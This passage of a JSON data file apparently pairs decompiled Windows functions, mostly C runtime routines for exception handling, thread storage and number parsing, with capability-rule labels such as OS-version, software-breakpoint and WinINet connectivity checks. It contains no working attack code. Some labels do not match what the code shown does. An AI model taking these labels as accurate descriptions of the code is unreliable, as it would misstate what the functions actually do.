            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00414222(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    int32_t *var_8h;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    var_1ch = *(arg_ch + 8);\n    _auStack8 = auStack8;\n    if ((var_1ch < -1) || (*(arg_18h + 4) <= var_1ch)) {\n        fcn.00414830();\n    }\n    if (*arg_8h == -0x1f928c9d) {\n        if ((arg_8h[4] == 3) && (((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521)) && (arg_8h[7] == 0)))) {\n            iVar2 = fcn.00414501();\n            if (*(iVar2 + 0x7c) == 0) {\n                return;\n            }\n            iVar2 = fcn.00414501();\n            arg_8h = *(iVar2 + 0x7c);\n            iVar2 = fcn.00414501();\n            arg_10h = *(iVar2 + 0x80);\n            _auStack8 = CONCAT13(1, auStack8);\n            iVar2 = fcn.0041b0a0(arg_8h, 1);\n            if (iVar2 == 0) {\n                fcn.00414830();\n            }\n            if (*arg_8h != -0x1f928c9d) goto code_r0x004143fb;\n            if (((arg_8h[4] == 3) && ((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521)))) && (arg_8h[7] == 0)) {\n                fcn.00414830();\n            }\n        }\n        iVar2 = var_1ch;\n        if (((*arg_8h == -0x1f928c9d) && (arg_8h[4] == 3)) && ((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521))))\n        {\n            piVar3 = fcn.00410b88(arg_18h, arg_20h, var_1ch, &var_ch, &var_20h);\n            var_8h = piVar3;\n            if (var_ch < var_20h) {\n                do {\n                    if ((*piVar3 == iVar2 || *piVar3 < iVar2) && (iVar2 <= piVar3[1])) {\n                        var_8h = piVar3;\n                        for (var_18h = piVar3[3]; 0 < var_18h; var_18h = var_18h + -1) {\n                            var_10h = *(arg_8h[7] + 0xc);\n                            for (var_14h = *var_10h; var_10h = var_10h + 1,  0 < var_14h; var_14h = var_14h + -1) {\n                                iVar2 = fcn.004138d4(arg_8h[7]);\n                                piVar3 = var_8h;\n                                if (iVar2 != 0) {\n                                    fcn.004140fd(arg_8h, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h);\n                                    goto code_r0x004143ce;\n                                }\n                            }\n                        }\n                    }\ncode_r0x004143ce:\n                    var_ch = var_ch + 1;\n                    piVar3 = piVar3 + 5;\n                    iVar2 = var_1ch;\n                    var_8h = piVar3;\n                } while (var_ch < var_20h);\n            }\n            if (arg_1ch == '\\0') {\n                return;\n            }\n            fcn.00413a3f(arg_8h);\n            return;\n        }\n    }\ncode_r0x004143fb:\n    if (arg_1ch == '\\0') {\n        fcn.00414164(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, var_1ch, arg_20h, arg_24h);\n        return;\n    }\n    fcn.00412580(0x455f18, 8);\n    iVar2 = fcn.00414501();\n    if (*(iVar2 + 0x6c) != 0) {\n        _auStack8 = 0;\n        iVar2 = fcn.00414501();\n        (**(iVar2 + 0x6c))();\n        _auStack8 = 0xffffffff;\n    }\n    fcn.004179c6(10);\n    fcn.0041efc5(0x16);\n    fcn.004123d5(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1277
    },
    "00414426": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00414426(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, uint arg_20h\n            , uint32_t arg_24h)\n\n{\n    uint uVar1;\n    \n    if ((*arg_18h & 0x1fffffff) != 0x19930520) {\n        fcn.00414830();\n    }\n    if ((*(arg_8h + 1) & 0x66) == 0) {\n        if (arg_18h[3] != 0) {\n            if (((*arg_8h == -0x1f928c9d) && (0x19930520 < arg_8h[5])) && (*(arg_8h[7] + 8) != NULL)) {\n                uVar1 = (**(arg_8h[7] + 8))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h & 0xff)\n                ;\n                return uVar1;\n            }\n            fcn.00414222(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_24h, arg_1ch, arg_20h);\n        }\n    }\n    else if ((arg_18h[1] != 0) && (arg_1ch == 0)) {\n        fcn.00413941(arg_ch, arg_14h, arg_18h, 0xffffffff);\n    }\n    return 1;\n}\n",
        "token_count": 375
    },
    "004144d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004144d1(void)\n\n{\n    int32_t arg_8h;\n    code *pcVar1;\n    int32_t *piVar2;\n    \n    if (*0x464364 != -1) {\n        (**0x4670dc)(*0x464364);\n        *0x464364 = -1;\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_DeleteCriticalSection;\n    piVar2 = 0x464390;\n    do {\n        arg_8h = *piVar2;\n        if ((arg_8h != 0) && (piVar2[1] != 1)) {\n            (*pcVar1)(arg_8h);\n            fcn.00411031(arg_8h);\n            *piVar2 = 0;\n        }\n        piVar2 = piVar2 + 2;\n    } while (piVar2 < 0x4644b0);\n    piVar2 = 0x464390;\n    do {\n        if ((*piVar2 != 0) && (piVar2[1] == 1)) {\n            (*pcVar1)(*piVar2);\n        }\n        piVar2 = piVar2 + 2;\n    } while (piVar2 < 0x4644b0);\n    return;\n}\n",
        "token_count": 282
    },
    "004146f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.004146f4(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    iVar2 = fcn.004164ba();\n    if (iVar2 == 0) {\n        fcn.004144d1();\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 != 0) {\n        *0x4670d0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"FlsAlloc\");\n        *0x4670d4 = (*pcVar1)(iVar2, \"FlsGetValue\");\n        *0x4670d8 = (*pcVar1)(iVar2, \"FlsSetValue\");\n        *0x4670dc = (*pcVar1)(iVar2, \"FlsFree\");\n        if (*0x4670d4 == 0) {\n            *0x4670d4 = _sym.imp.KERNEL32.dll_TlsGetValue;\n            *0x4670d8 = _sym.imp.KERNEL32.dll_TlsSetValue;\n            *0x4670d0 = 0x4144c8;\n            *0x4670dc = _sym.imp.KERNEL32.dll_TlsFree;\n        }\n    }\n    *0x464364 = (**0x4670d0)(fcn.00414572);\n    if (((*0x464364 != -1) && (puVar3 = fcn.004136f2(1, 0x8c),  puVar3 != NULL)) &&\n       (iVar2 = (**0x4670d8)(*0x464364, puVar3),  iVar2 != 0)) {\n        puVar3[0x15] = 0x464558;\n        puVar3[5] = 1;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        puVar3[1] = 0xffffffff;\n        *puVar3 = uVar4;\n        return 1;\n    }\n    fcn.004144d1();\n    return 0;\n}\n",
        "token_count": 491
    },
    "0041494d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041494d(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h != 0) {\n        fcn.0041b5a6(&var_8h, arg_10h);\n        *arg_ch = var_8h;\n        arg_ch[1] = var_4h;\n        return;\n    }\n    fcn.0041b621(&arg_8h, arg_10h);\n    *arg_ch = arg_8h;\n    return;\n}\n",
        "token_count": 145
    },
    "004149a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004149a8(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t *in_EAX;\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *unaff_EBX;\n    \n    if (arg_10h != '\\0') {\n        fcn.0041498b();\n    }\n    if (*in_EAX == 0x2d) {\n        *unaff_EBX = 0x2d;\n        unaff_EBX = unaff_EBX + 1;\n    }\n    puVar1 = unaff_EBX;\n    if (0 < arg_8h) {\n        puVar1 = unaff_EBX + 1;\n        *unaff_EBX = *puVar1;\n        *puVar1 = *0x464924;\n    }\n    puVar1 = fcn.004190f0(puVar1 + arg_8h + (arg_10h == '\\0'), \"e+000\");\n    if (arg_ch != 0) {\n        *puVar1 = 0x45;\n    }\n    if (*in_EAX[3] != '0') {\n        iVar2 = in_EAX[1] + -1;\n        if (iVar2 < 0) {\n            iVar2 = -iVar2;\n            puVar1[1] = 0x2d;\n        }\n        if (99 < iVar2) {\n            iVar3 = iVar2 / 100;\n            iVar2 = iVar2 % 100;\n            puVar1[2] = puVar1[2] + iVar3;\n        }\n        if (9 < iVar2) {\n            iVar3 = iVar2 / 10;\n            iVar2 = iVar2 % 10;\n            puVar1[3] = puVar1[3] + iVar3;\n        }\n        puVar1[4] = puVar1[4] + iVar2;\n    }\n    return;\n}\n",
        "token_count": 440
    },
    "00414ac2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00414ac2(uchar *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uchar *puVar3;\n    \n    iVar1 = in_EAX[1];\n    if ((arg_10h != '\\0') && (iVar1 + -1 == arg_ch)) {\n        iVar2 = *in_EAX;\n        arg_8h[(iVar2 == 0x2d) + iVar1 + -1] = 0x30;\n        (arg_8h + (iVar2 == 0x2d) + iVar1 + -1)[1] = 0;\n    }\n    puVar3 = arg_8h;\n    if (*in_EAX == 0x2d) {\n        *arg_8h = 0x2d;\n        puVar3 = arg_8h + 1;\n    }\n    if (in_EAX[1] < 1) {\n        fcn.0041498b();\n        *puVar3 = 0x30;\n        puVar3 = puVar3 + 1;\n    }\n    else {\n        puVar3 = puVar3 + in_EAX[1];\n    }\n    if (0 < arg_ch) {\n        fcn.0041498b();\n        *puVar3 = *0x464924;\n        iVar1 = in_EAX[1];\n        if (iVar1 < 0) {\n            if ((arg_10h != '\\0') || (SBORROW4(arg_ch, -iVar1) == arg_ch + iVar1 < 0)) {\n                arg_ch = -iVar1;\n            }\n            fcn.0041498b();\n            fcn.00411850(puVar3 + 1, 0x30, arg_ch);\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 425
    },
    "00414d7e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.00414d7e(uint arg_8h_2, uint arg_ch_2, uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uchar uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    uint uVar10;\n    uint32_t uVar11;\n    uint8_t uVar12;\n    uint8_t uVar13;\n    uint32_t uVar14;\n    uint *puVar15;\n    int32_t unaff_EBP;\n    uint8_t *puVar16;\n    uint8_t *puVar17;\n    char *pcVar18;\n    char *pcVar19;\n    uint *puVar20;\n    uint8_t *puVar21;\n    ulong uVar22;\n    uint var_4h;\n    uint var_1e8h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_194h;\n    uint var_18ch;\n    uint var_184h;\n    uint var_17dh;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h_2;\n    uint uStack4;\n    \n    uStack4 = 0x1cc;\n    var_4h_2 = 0x455f78;\n    fcn.00412580();\n    *(unaff_EBP + -0x1c) = *0x4640c8;\n    *(unaff_EBP + -0x1bc) = 0;\n    *(unaff_EBP + -0x1d8) = 0;\n    *(unaff_EBP + -0x1b0) = 0;\n    *(unaff_EBP + -0x194) = 0;\n    *(unaff_EBP + -0x195) = 0;\n    *(unaff_EBP + -0x184) = 0;\n    *(unaff_EBP + -0x1b8) = 0;\ncode_r0x00414dc1:\n    if (**(unaff_EBP + 0xc) == '\\0') {\ncode_r0x00415ab3:\n        if (*(unaff_EBP + -0x1d8) == 1) {\n            fcn.00411031(*(unaff_EBP + -0x1bc));\n        }\n        *(unaff_EBP + -0x1ec) = 0x415af4;\n        fcn.0041176c();\n        *(unaff_EBP + -0x1ec) = 0x415af9;\n        fcn.004125bb();\n        return;\n    }\n    iVar7 = fcn.0041ae9e(**(unaff_EBP + 0xc));\n    if (iVar7 != 0) {\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n        do {\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.00414d3e();\n            iVar8 = fcn.0041ae9e(iVar7);\n        } while (iVar8 != 0);\n        if (iVar7 != -1) {\n            fcn.0041bad2(iVar7, *(unaff_EBP + 8));\n        }\n        do {\n            *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + 1;\n            iVar7 = fcn.0041ae9e(**(unaff_EBP + 0xc));\n        } while (iVar7 != 0);\n        goto code_r0x00414dc1;\n    }\n    puVar21 = *(unaff_EBP + 0xc);\n    if (*puVar21 != 0x25) {\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n        uVar14 = fcn.00414d3e();\n        *(unaff_EBP + -0x194) = uVar14;\n        uVar13 = *puVar21;\n        *(unaff_EBP + 0xc) = puVar21 + 1;\n        if (uVar13 != uVar14) goto code_r0x00415a7a;\n        if ((*(*0x46495c + 1 + (uVar14 & 0xff) * 2) & 0x80) != 0) {\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            uVar11 = fcn.00414d3e();\n            uVar13 = puVar21[1];\n            *(unaff_EBP + 0xc) = puVar21 + 2;\n            if (uVar13 != uVar11) {\n                if (uVar11 != 0xffffffff) {\n                    fcn.0041bad2(uVar11, *(unaff_EBP + 8));\n                }\n                goto code_r0x00415a7a;\n            }\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n        }\n        goto code_r0x00415a94;\n    }\n    iVar7 = 0;\n    *(unaff_EBP + -0x1a0) = 0;\n    *(unaff_EBP + -0x198) = 0;\n    *(unaff_EBP + -0x19c) = 0;\n    *(unaff_EBP + -0x1b4) = 0;\n    *(unaff_EBP + -0x18c) = 0;\n    *(unaff_EBP + -0x1a1) = 0;\n    *(unaff_EBP + -0x197) = 0;\n    *(unaff_EBP + -0x18e) = 0;\n    *(unaff_EBP + -0x17d) = 0;\n    *(unaff_EBP + -0x196) = 0;\n    *(unaff_EBP + -0x185) = 0;\n    *(unaff_EBP + -0x18d) = 1;\n    *(unaff_EBP + -0x1c8) = 0;\n    do {\n        puVar16 = puVar21 + 1;\n        uVar14 = *puVar16;\n        iVar8 = fcn.0041ae25(uVar14);\n        puVar17 = puVar16;\n        if (iVar8 == 0) {\n            if (uVar14 < 0x4f) {\n                if (uVar14 != 0x4e) {\n                    if (uVar14 == 0x2a) {\n                        *(unaff_EBP + -0x18e) = *(unaff_EBP + -0x18e) + '\\x01';\n                    }\n                    else if (uVar14 != 0x46) {\n                        if (uVar14 == 0x49) {\n                            uVar13 = puVar21[2];\n                            if ((uVar13 == 0x36) && (puVar21[3] == 0x34)) {\n                                *(unaff_EBP + -0x1c8) = *(unaff_EBP + -0x1c8) + 1;\n                                *(unaff_EBP + -0x1ac) = 0;\n                                *(unaff_EBP + -0x1a8) = 0;\n                                puVar17 = puVar21 + 3;\n                            }\n                            else if (((uVar13 != 0x33) || (puVar17 = puVar21 + 3,  *puVar17 != 0x32)) &&\n                                    ((((puVar17 = puVar16,  uVar13 != 100 && (uVar13 != 0x69)) && (uVar13 != 0x6f)) &&\n                                     ((uVar13 != 0x78 && (uVar13 != 0x58)))))) goto code_r0x00414f48;\n                        }\n                        else if (uVar14 == 0x4c) {\n                            *(unaff_EBP + -0x18d) = *(unaff_EBP + -0x18d) + '\\x01';\n                        }\n                        else {\ncode_r0x00414f48:\n                            *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                            puVar17 = puVar16;\n                        }\n                    }\n                }\n            }\n            else if (uVar14 == 0x68) {\n                *(unaff_EBP + -0x18d) = *(unaff_EBP + -0x18d) + -1;\n                *(unaff_EBP + -0x185) = *(unaff_EBP + -0x185) + -1;\n            }\n            else {\n                if (uVar14 == 0x6c) {\n                    *(unaff_EBP + -0x18d) = *(unaff_EBP + -0x18d) + '\\x01';\n                }\n                else if (uVar14 != 0x77) goto code_r0x00414f48;\n                *(unaff_EBP + -0x185) = *(unaff_EBP + -0x185) + '\\x01';\n            }\n        }\n        else {\n            *(unaff_EBP + -0x1b4) = *(unaff_EBP + -0x1b4) + 1;\n            iVar7 = (uVar14 - 0x30) + iVar7 * 10;\n        }\n        puVar21 = puVar17;\n    } while (*(unaff_EBP + -0x17d) == '\\0');\n    *(unaff_EBP + -0x18c) = iVar7;\n    *(unaff_EBP + 0xc) = puVar17;\n    if (*(unaff_EBP + -0x18e) == '\\0') {\n        puVar15 = *(unaff_EBP + 0x10);\n        *(unaff_EBP + -0x1dc) = puVar15;\n        *(unaff_EBP + 0x10) = puVar15 + 1;\n        puVar15 = *puVar15;\n        *(unaff_EBP + -0x1b0) = puVar15;\n    }\n    else {\n        puVar15 = *(unaff_EBP + -0x1b0);\n    }\n    *(unaff_EBP + -0x17d) = 0;\n    if ((*(unaff_EBP + -0x185) == '\\0') &&\n       ((uVar13 = *puVar17,  uVar13 == 0x53 || (*(unaff_EBP + -0x185) = 0xff,  uVar13 == 0x43)))) {\n        *(unaff_EBP + -0x185) = 1;\n    }\n    uVar14 = *puVar17 | 0x20;\n    *(unaff_EBP + -0x1c0) = uVar14;\n    if (uVar14 == 0x6e) {\ncode_r0x00415015:\n        uVar9 = *(unaff_EBP + 8);\n    }\n    else {\n        if ((uVar14 != 99) && (uVar14 != 0x7b)) {\n            do {\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                uVar9 = fcn.00414d3e();\n                iVar7 = fcn.0041ae9e(uVar9);\n            } while (iVar7 != 0);\n            *(unaff_EBP + -0x194) = uVar9;\n            goto code_r0x00415015;\n        }\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n        uVar9 = *(unaff_EBP + 8);\n        uVar10 = fcn.00414d3e();\n        *(unaff_EBP + -0x194) = uVar10;\n    }\n    iVar7 = *(unaff_EBP + -0x1b4);\n    if ((iVar7 != 0) && (*(unaff_EBP + -0x18c) == 0)) {\ncode_r0x00415325:\n        uVar14 = *(unaff_EBP + -0x194);\ncode_r0x00415a7a:\n        if (uVar14 != 0xffffffff) {\n            fcn.0041bad2(*(unaff_EBP + -0x194), *(unaff_EBP + 8));\n        }\n        goto code_r0x00415ab3;\n    }\n    if (0x6f < uVar14) {\n        if (uVar14 == 0x70) {\n            *(unaff_EBP + -0x18d) = 1;\ncode_r0x00415712:\n            uVar11 = *(unaff_EBP + -0x194);\n            if (uVar11 == 0x2d) {\n                *(unaff_EBP + -0x197) = 1;\n            }\n            else if (uVar11 != 0x2b) goto code_r0x00415755;\n            piVar1 = unaff_EBP + -0x18c;\n            *piVar1 = *piVar1 + -1;\n            if ((*piVar1 == 0) && (iVar7 != 0)) {\n                *(unaff_EBP + -0x17d) = 1;\n            }\n            else {\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                uVar11 = fcn.00414d3e();\ncode_r0x0041574f:\n                *(unaff_EBP + -0x194) = uVar11;\n            }\n        }\n        else {\n            if (uVar14 == 0x73) {\ncode_r0x004152d8:\n                if ('\\0' < *(unaff_EBP + -0x185)) {\n                    *(unaff_EBP + -0x196) = 1;\n                }\ncode_r0x004154a2:\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                puVar20 = puVar15;\n                if (*(unaff_EBP + -0x194) != -1) {\n                    fcn.0041bad2(*(unaff_EBP + -0x194), *(unaff_EBP + 8));\n                }\n                do {\n                    if ((*(unaff_EBP + -0x1b4) != 0) &&\n                       (iVar7 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar7 == 0)\n                       ) goto code_r0x004156c3;\n                    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                    uVar11 = fcn.00414d3e();\n                    *(unaff_EBP + -0x194) = uVar11;\n                    if (uVar11 == 0xffffffff) goto code_r0x004156ad;\n                    uVar13 = uVar11;\n                    if ((uVar14 != 99) && (((uVar14 != 0x73 || ((8 < uVar11 && (uVar11 < 0xe)))) || (uVar11 == 0x20))))\n                    {\n                        if ((uVar14 != 0x7b) ||\n                           (((*((uVar11 >> 3) + *(unaff_EBP + -0x1bc)) ^ *(unaff_EBP + -0x1a1)) & 1 << (uVar13 & 7)) ==\n                            0)) goto code_r0x004156ad;\n                        uVar14 = *(unaff_EBP + -0x1c0);\n                    }\n                    if (*(unaff_EBP + -0x18e) == '\\0') {\n                        if (*(unaff_EBP + -0x196) == '\\0') {\n                            *puVar15 = uVar13;\n                            puVar15 = puVar15 + 1;\n                        }\n                        else {\n                            *(unaff_EBP + -0x1c4) = uVar13;\n                            if ((*(*0x46495c + 1 + (uVar11 & 0xff) * 2) & 0x80) != 0) {\n                                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                                uVar6 = fcn.00414d3e();\n                                *(unaff_EBP + -0x1c3) = uVar6;\n                            }\n                            fcn.0041bc43(unaff_EBP + -0x1cc, unaff_EBP + -0x1c4, *0x464920);\n                            *puVar15 = *(unaff_EBP + -0x1cc);\n                            puVar15 = puVar15 + 2;\n                        }\n                        *(unaff_EBP + -0x1b0) = puVar15;\n                    }\n                    else {\n                        puVar20 = puVar20 + 1;\n                    }\n                } while( true );\n            }\n            if (uVar14 == 0x75) goto code_r0x00415712;\n            if (uVar14 != 0x78) {\n                if (uVar14 == 0x7b) {\n                    if ('\\0' < *(unaff_EBP + -0x185)) {\n                        *(unaff_EBP + -0x196) = 1;\n                    }\n                    iVar7 = *(unaff_EBP + 0xc);\n                    puVar21 = iVar7 + 1;\n                    *(unaff_EBP + 0xc) = puVar21;\n                    *(unaff_EBP + -0x1d0) = puVar21;\n                    if (*puVar21 == 0x5e) {\n                        puVar21 = iVar7 + 2;\n                        *(unaff_EBP + -0x1d0) = puVar21;\n                        *(unaff_EBP + -0x1a1) = 0xff;\n                    }\n                    puVar15 = *(unaff_EBP + -0x1bc);\n                    if (*(unaff_EBP + -0x1bc) == NULL) {\n                        *(unaff_EBP + -4) = 0;\n                        fcn.004112a0();\n                        *(unaff_EBP + -0x18) = &fcn.00414d7e::var_4h_2;\n                        *(unaff_EBP + -0x1bc) = &fcn.00414d7e::var_4h_2;\n                        *(unaff_EBP + -4) = 0xffffffff;\n                        puVar15 = &fcn.00414d7e::var_4h_2;\n                    }\n                    fcn.00411850(puVar15, 0, 0x20);\n                    if (*(unaff_EBP + -0x1c0) != 0x7b) goto code_r0x00415476;\n                    if (*puVar21 != 0x5d) goto code_r0x00415476;\n                    uVar13 = 0x5d;\n                    puVar21 = puVar21 + 1;\n                    *(puVar15 + 0xb) = 0x20;\n                    while (uVar12 = *puVar21,  uVar12 != 0x5d) {\n                        if (((uVar12 == 0x2d) && (uVar13 != 0)) && (uVar3 = puVar21[1],  uVar3 != 0x5d)) {\n                            puVar21 = puVar21 + 2;\n                            uVar12 = uVar3;\n                            if (uVar13 < uVar3) {\n                                uVar12 = uVar13;\n                                uVar13 = uVar3;\n                            }\n                            if (uVar12 <= uVar13) {\n                                uVar14 = uVar12;\n                                *(unaff_EBP + -0x1d4) = (uVar13 - uVar12) + 1;\n                                do {\n                                    *(puVar15 + (uVar14 >> 3)) = *(puVar15 + (uVar14 >> 3)) | '\\x01' << (uVar14 & 7);\n                                    uVar14 = uVar14 + 1;\n                                    piVar1 = unaff_EBP + -0x1d4;\n                                    *piVar1 = *piVar1 + -1;\n                                } while (*piVar1 != 0);\n                            }\n                            uVar13 = 0;\n                        }\n                        else {\n                            *(unaff_EBP + -0x198) = uVar12;\n                            *(puVar15 + (uVar12 >> 3)) = *(puVar15 + (uVar12 >> 3)) | '\\x01' << (uVar12 & 7);\n                            puVar21 = puVar21 + 1;\ncode_r0x00415476:\n                            uVar13 = *(unaff_EBP + -0x198);\n                        }\n                    }\n                    puVar15 = *(unaff_EBP + -0x1b0);\n                    if (*(unaff_EBP + -0x1c0) == 0x7b) {\n                        *(unaff_EBP + 0xc) = puVar21;\n                    }\n                    uVar14 = *(unaff_EBP + -0x1c0);\n                    goto code_r0x004154a2;\n                }\n                goto code_r0x00415317;\n            }\ncode_r0x0041509f:\n            uVar11 = *(unaff_EBP + -0x194);\n            if (uVar11 == 0x2d) {\n                *(unaff_EBP + -0x197) = 1;\ncode_r0x004155c5:\n                piVar1 = unaff_EBP + -0x18c;\n                *piVar1 = *piVar1 + -1;\n                if ((*piVar1 == 0) && (iVar7 != 0)) {\n                    *(unaff_EBP + -0x17d) = 1;\n                }\n                else {\n                    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                    uVar11 = fcn.00414d3e();\n                    *(unaff_EBP + -0x194) = uVar11;\n                }\n            }\n            else if (uVar11 == 0x2b) goto code_r0x004155c5;\n            if (uVar11 == 0x30) {\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                uVar11 = fcn.00414d3e();\n                *(unaff_EBP + -0x194) = uVar11;\n                if ((uVar11 == 'x') || (uVar11 == 'X')) {\n                    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                    uVar11 = fcn.00414d3e();\n                    *(unaff_EBP + -0x194) = uVar11;\n                    if ((*(unaff_EBP + -0x1b4) != 0) &&\n                       (*(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -2,  *(unaff_EBP + -0x18c) < 1)) {\n                        *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                    }\n                    uVar14 = 0x78;\n                }\n                else {\n                    *(unaff_EBP + -0x19c) = 1;\n                    if (uVar14 == 0x78) {\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                        if (uVar11 != 0xffffffff) {\n                            fcn.0041bad2(uVar11, uVar9);\n                        }\n                        uVar11 = 0x30;\n                        goto code_r0x0041574f;\n                    }\n                    if (*(unaff_EBP + -0x1b4) != 0) {\n                        piVar1 = unaff_EBP + -0x18c;\n                        *piVar1 = *piVar1 + -1;\n                        if (*piVar1 == 0) {\n                            *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                        }\n                    }\n                    uVar14 = 0x6f;\n                }\n            }\n        }\ncode_r0x00415755:\n        if (*(unaff_EBP + -0x1c8) == 0) {\n            if (*(unaff_EBP + -0x17d) == '\\0') {\n                do {\n                    if ((uVar14 == 0x78) || (uVar14 == 0x70)) {\n                        iVar7 = fcn.0041ae5f(uVar11);\n                        if (iVar7 != 0) {\n                            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) << 4;\n                            iVar7 = fcn.0041ae25(uVar11);\n                            if (iVar7 == 0) {\n                                uVar11 = (uVar11 & 0xffffffdf) - 7;\n                            }\n                            goto code_r0x00415932;\n                        }\ncode_r0x0041592c:\n      